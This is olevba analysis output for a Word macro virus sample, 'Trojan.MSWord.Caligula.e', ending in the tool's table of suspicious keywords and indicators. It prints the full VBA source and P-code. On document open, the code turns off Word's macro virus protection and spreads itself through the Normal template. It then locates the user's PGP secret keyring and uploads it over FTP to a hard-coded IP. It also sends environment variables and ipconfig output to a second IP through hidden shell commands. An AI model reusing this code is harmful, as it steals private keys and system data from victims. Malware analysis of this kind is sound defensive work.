olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan.MSWord.Caligula.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan.MSWord.Caligula.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Caligula.bas 
in file: ./Trojan.MSWord.Caligula.e - OLE stream: 'Macros/VBA/Caligula'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

GoTo cnlabTest

On Error Resume Next
    
With Dialogs(wdDialogFileSummaryInfo)
.Author = "Opic"
.Title = "WM97/Caligula Infection"
.Subject = "A Study In Espionage Enabled Viruses."
.Comments = "The Best Security Is Knowing The Other Guy Hasn't Got Any."
.Keywords = " | Caligula | Opic | CodeBreakers | "
.Execute
End With

Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False

Application.ScreenUpdating = False
Application.DisplayStatusBar = False
Application.DisplayAlerts = False

CommandBars("tools").Controls("Macro").Enabled = False
CommandBars("tools").Controls("Customize...").Enabled = False
CommandBars("view").Controls("Toolbars").Enabled = False
CommandBars("view").Controls("Status Bar").Enabled = False

If NormalTemplate.VBProject.VBComponents.Item("Caligula").Name <> "Caligula" Then
NotInNorm = True
ActiveDocument.VBProject.VBComponents("Caligula").Export "c:\io.vxd"
Set Dobj = NormalTemplate.VBProject
ElseIf ActiveDocument.VBProject.VBComponents.Item("Caligula").Name <> "Caligula" Then
NotInActiv = True
NormalTemplate.VBProject.VBComponents("Caligula").Export "c:\io.vxd"
Set Dobj = ActiveDocument.VBProject
End If

If NotInNorm = True Or NotInActiv = True Then Dobj.VBComponents.Import ("c:\io.vxd")

If Day(Now) = 31 Then MsgBox "No cia," & vbCr & "No nsa," & vbCr & "No satellite," & vbCr & "Could map our veins.", 0, "WM97/Caligula (c) Opic [CodeBreakers 1998]"

If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Caligula") = False) Then

pgppath = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PGP Encrypted File\shell\open\command", "")
Position = InStr(1, pgppath, "pgpt")

If Position <> 0 Then
pgppath = Mid(pgppath, 1, Position - 2)
Else
GoTo noPGP
End If

With Application.FileSearch
    .FileName = "\Secring.skr"
    .LookIn = pgppath
    .SearchSubFolders = True
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
    .Execute
    PGP_Sec_Key = .FoundFiles(1)
End With

Randomize
  For i = 1 To 4
    NewSecRingFile = NewSecRingFile + Mid(Str(Int(8 * Rnd)), 2, 1)
  Next i
  NewSecRingFile = "./secring" & NewSecRingFile & ".skr"

Open "c:\cdbrk.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "binary"
    Print #1, "put """ & PGP_Sec_Key & """ """ & NewSecRingFile & """"
    Print #1, "quit"
    Close #1

Shell "command.com /c ftp.exe -n -s:c:\cdbrk.vxd", vbHide

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Caligula") = True

End If

noPGP:

If NotInActiv = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument

cnlabTest:

Rem
Rem ramdom file name generieren
Rem
Randomize
  For i = 1 To 4
    NewFile = NewFile + Mid(Str(Int(8 * Rnd)), 2, 1)
  Next i
  NewFile = "./test" & NewFile & ".txt"

Rem
Rem upload Daten generieren
Rem
Open "c:\cnlab.bat" For Output As #1
    Print #1, "set > c:\cnlab.txt"
    Print #1, "ipconfig >> c:\cnlab.txt"
    Print #1, "ftp.exe -n -s:c:\cnlab.ftp"
    Print #1, "del c:\cnlab.ftp c:\cnlab.txt"
Close #1

Open "c:\cnlab.ftp" For Output As #2
    Print #2, "o 160.63.96.71"
    Print #2, "user anonymous"
    Print #2, "pass itsme@"
    Print #2, "cd upload"
    Print #2, "ascii"
    Print #2, "put ""c:\cnlab.txt"" """ & NewFile & """"
    Print #2, "quit"
Close #2

Rem
Rem ftp durchführen
Rem
Shell "command.com /c c:\cnlab.bat", vbHide

Rem
Rem aufräumen
Rem
' Shell "command.com /c del c:\cnlab.bat", vbHide
ActiveDocument.VBProject.VBComponents("Caligula").CodeModule.DeleteLines StartLine:=2, Count:=130

ActiveDocument.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Trojan.MSWord.Caligula.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Caligula - 9802 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' Line #2:
' 	GoTo cnlabTest 
' Line #3:
' Line #4:
' 	OnError (Resume Next) 
' Line #5:
' Line #6:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #7:
' 	LitStr 0x0004 "Opic"
' 	MemStWith Author 
' Line #8:
' 	LitStr 0x0017 "WM97/Caligula Infection"
' 	MemStWith Title 
' Line #9:
' 	LitStr 0x0025 "A Study In Espionage Enabled Viruses."
' 	MemStWith Subject 
' Line #10:
' 	LitStr 0x003A "The Best Security Is Knowing The Other Guy Hasn't Got Any."
' 	MemStWith Comments 
' Line #11:
' 	LitStr 0x0024 " | Caligula | Opic | CodeBreakers | "
' 	MemStWith Keywords 
' Line #12:
' 	ArgsMemCallWith Execute 0x0000 
' Line #13:
' 	EndWith 
' Line #14:
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #18:
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #21:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #22:
' Line #23:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #24:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Customize..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #25:
' 	LitVarSpecial (False)
' 	LitStr 0x0008 "Toolbars"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #26:
' 	LitVarSpecial (False)
' 	LitStr 0x000A "Status Bar"
' 	LitStr 0x0004 "view"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #27:
' Line #28:
' 	LitStr 0x0008 "Caligula"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "Caligula"
' 	Ne 
' 	IfBlock 
' Line #29:
' 	LitVarSpecial (True)
' 	St NotInNorm 
' Line #30:
' 	LitStr 0x0009 "c:\io.vxd"
' 	LitStr 0x0008 "Caligula"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #31:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set Dobj 
' Line #32:
' 	LitStr 0x0008 "Caligula"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0008 "Caligula"
' 	Ne 
' 	ElseIfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St NotInActiv 
' Line #34:
' 	LitStr 0x0009 "c:\io.vxd"
' 	LitStr 0x0008 "Caligula"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #35:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set Dobj 
' Line #36:
' 	EndIfBlock 
' Line #37:
' Line #38:
' 	Ld NotInNorm 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NotInActiv 
' 	LitVarSpecial (True)
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "c:\io.vxd"
' 	Paren 
' 	Ld Dobj 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' 	EndIf 
' Line #39:
' Line #40:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0007 "No cia,"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "No nsa,"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x000D "No satellite,"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0014 "Could map our veins."
' 	Concat 
' 	LitDI2 0x0000 
' 	LitStr 0x002A "WM97/Caligula (c) Opic [CodeBreakers 1998]"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' Line #41:
' Line #42:
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0008 "Caligula"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	IfBlock 
' Line #43:
' Line #44:
' 	LitStr 0x0000 ""
' 	LitStr 0x0037 "HKEY_CLASSES_ROOT\PGP Encrypted File\shell\open\command"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St pgppath 
' Line #45:
' 	LitDI2 0x0001 
' 	Ld pgppath 
' 	LitStr 0x0004 "pgpt"
' 	FnInStr3 
' 	St Position 
' Line #46:
' Line #47:
' 	Ld Position 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #48:
' 	Ld pgppath 
' 	LitDI2 0x0001 
' 	Ld Position 
' 	LitDI2 0x0002 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St pgppath 
' Line #49:
' 	ElseBlock 
' Line #50:
' 	GoTo noPGP 
' Line #51:
' 	EndIfBlock 
' Line #52:
' Line #53:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #54:
' 	LitStr 0x000C "\Secring.skr"
' 	MemStWith FileName 
' Line #55:
' 	Ld pgppath 
' 	MemStWith LookIn 
' Line #56:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #57:
' 	LitVarSpecial (True)
' 	MemStWith MatchTextExactly 
' Line #58:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #59:
' 	ArgsMemCallWith Execute 0x0000 
' Line #60:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St PGP_Sec_Key 
' Line #61:
' 	EndWith 
' Line #62:
' Line #63:
' 	ArgsCall Read 0x0000 
' Line #64:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #65:
' 	Ld NewSecRingFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St NewSecRingFile 
' Line #66:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #67:
' 	LitStr 0x0009 "./secring"
' 	Ld NewSecRingFile 
' 	Concat 
' 	LitStr 0x0004 ".skr"
' 	Concat 
' 	St NewSecRingFile 
' Line #68:
' Line #69:
' 	LitStr 0x000C "c:\cdbrk.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "o 209.201.88.110"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "user anonymous"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass itsme@"
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "put ""
' 	Ld PGP_Sec_Key 
' 	Concat 
' 	LitStr 0x0003 "" ""
' 	Concat 
' 	Ld NewSecRingFile 
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #78:
' Line #79:
' 	LitStr 0x0029 "command.com /c ftp.exe -n -s:c:\cdbrk.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #80:
' Line #81:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0008 "Caligula"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #82:
' Line #83:
' 	EndIfBlock 
' Line #84:
' Line #85:
' 	Label noPGP 
' Line #86:
' Line #87:
' 	Ld NotInActiv 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #88:
' Line #89:
' 	Label cnlabTest 
' Line #90:
' Line #91:
' 	Rem 0x0000 ""
' Line #92:
' 	Rem 0x001C " ramdom file name generieren"
' Line #93:
' 	Rem 0x0000 ""
' Line #94:
' 	ArgsCall Read 0x0000 
' Line #95:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #96:
' 	Ld NewFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St NewFile 
' Line #97:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #98:
' 	LitStr 0x0006 "./test"
' 	Ld NewFile 
' 	Concat 
' 	LitStr 0x0004 ".txt"
' 	Concat 
' 	St NewFile 
' Line #99:
' Line #100:
' 	Rem 0x0000 ""
' Line #101:
' 	Rem 0x0018 " upload Daten generieren"
' Line #102:
' 	Rem 0x0000 ""
' Line #103:
' 	LitStr 0x000C "c:\cnlab.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "set > c:\cnlab.txt"
' 	PrintItemNL 
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "ipconfig >> c:\cnlab.txt"
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "ftp.exe -n -s:c:\cnlab.ftp"
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "del c:\cnlab.ftp c:\cnlab.txt"
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #109:
' Line #110:
' 	LitStr 0x000C "c:\cnlab.ftp"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #111:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "o 160.63.96.71"
' 	PrintItemNL 
' Line #112:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "user anonymous"
' 	PrintItemNL 
' Line #113:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass itsme@"
' 	PrintItemNL 
' Line #114:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "cd upload"
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ascii"
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "put "c:\cnlab.txt" ""
' 	Ld NewFile 
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0002 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #119:
' Line #120:
' 	Rem 0x0000 ""
' Line #121:
' 	Rem 0x0010 " ftp durchführen"
' Line #122:
' 	Rem 0x0000 ""
' Line #123:
' 	LitStr 0x001B "command.com /c c:\cnlab.bat"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #124:
' Line #125:
' 	Rem 0x0000 ""
' Line #126:
' 	Rem 0x000A " aufräumen"
' Line #127:
' 	Rem 0x0000 ""
' Line #128:
' 	QuoteRem 0x0000 0x0030 " Shell "command.com /c del c:\cnlab.bat", vbHide"
' Line #129:
' 	LitDI2 0x0002 
' 	ParamNamed StartLine 
' 	LitDI2 0x0082 
' 	ParamNamed Count 
' 	LitStr 0x0008 "Caligula"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #130:
' Line #131:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #132:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |160.63.96.71        |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|IOC       |cnlab.bat           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

